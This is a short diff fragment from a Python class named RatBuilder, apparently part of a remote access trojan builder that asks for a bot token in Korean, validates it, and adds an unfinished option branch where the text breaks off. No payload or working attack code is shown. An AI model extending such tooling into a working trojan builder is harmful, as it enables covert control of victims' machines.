@@ -26,3 +26,6 @@ class RatBuilder(PluginABC):
 
         token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 봇 토큰: ')
         await TokenValidator(token)
+
+        if option == 1:
+        
